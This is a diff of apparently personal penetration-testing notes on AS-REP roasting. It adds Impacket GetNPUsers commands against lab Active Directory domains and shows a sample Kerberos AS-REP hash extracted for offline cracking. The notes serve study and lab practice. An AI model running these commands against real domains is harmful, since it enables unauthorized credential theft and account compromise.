@@ -41,13 +41,21 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:svc /nowrap
 
 ## Impacket
 
+we need to add IP and domain into /etc/hosts first
+
+{% code overflow="wrap" %}
 ```python
-└─$ impacket-GetNPUsers vulnableone.local/app-svc -dc-ip 10.10.10.10 -no-pass
-└─$ impacket-GetNPUsers -no-pass -usersfile svc.txt -dc-ip 10.10.10.10 'vulnableone.local/'
+GetNPUsers.py inlanefreight.local/pixis.smith
+GetNPUsers.py inlanefreight.local/pixis/smith -request 
+GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
+
+## impacket
+impacket-GetNPUsers -no-pass -usersfile svc.txt -dc-ip 10.10.10.10 'vulnableone.local/'
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 $krb5asrep$23$svc-admin@VULNABLEONE.LOCAL:abe0d0e1b34713c079bfcada6483eaf6...
 ```
+{% endcode %}
 
 ## Crack Hash
 
